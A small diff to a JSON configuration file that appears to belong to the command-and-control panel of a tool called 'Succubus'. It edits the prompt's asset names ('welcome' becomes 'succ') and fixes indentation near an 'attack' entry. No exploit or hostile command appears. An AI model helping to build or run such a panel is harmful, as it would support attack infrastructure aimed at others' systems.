@@ -32,9 +32,9 @@
 		"prompt":"<argon>┌──</>[<argon>Succubus</>]-[~/<argon>succubus</>/<argon>cnc</>/<argon><<$username>></>]\r\n<argon>└───</>➤",
 		
         "assets":{
-            "welcome":"welcome",
+            "welcome":"succ",
             "banner":"succ",
-		    "attack":"attack"
+            "attack":"attack"
         },
 
         "errors":{
